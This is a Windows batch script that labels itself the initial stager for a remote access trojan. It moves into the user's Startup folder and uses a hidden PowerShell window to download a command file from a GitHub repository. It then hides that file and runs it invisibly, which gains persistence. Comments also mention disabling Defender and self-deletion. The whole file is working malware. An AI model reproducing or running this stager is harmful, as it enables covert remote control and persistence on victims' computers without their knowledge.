@echo off
REM initial stager for RAT 
REM created by :CHEPHYTY
REM move into startup directory

REM variables 
REM INITIALPATH capture the current path of the dir
set "INITIALPATH=%cd%" 
REM  STARTUP capture the path of the microsoft startup file
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM move into startup directory
cd /d "%STARTUP%"

REM TODO: Build out stage two
REM write payloads to startup
@REM https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd

@REM (echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > wget.cmd
@REM Disable defender and execute downloaded script
powershell -windowstyle hidden -Command ^
"try { ^
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -OutFile 'wget.cmd'; ^
} catch { ^
    Write-Error 'An error occurred: ' + $_.Exception.Message; ^
}"

REM hide the stage2.cmd file
attrib +h wget.cmd
 
REM run payload 
@REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
@REM powershell start wget.cmd
powershell -windowstyle hidden -Command "Start-Process 'cmd.exe' -ArgumentList '/c wget.cmd' -WindowStyle Hidden"

REM cd back into initial location
REM cd /d "%INITIALPATH%"

REM @REM self-delete without error message
REM start /b "" cmd /c del "%~f0"&exit
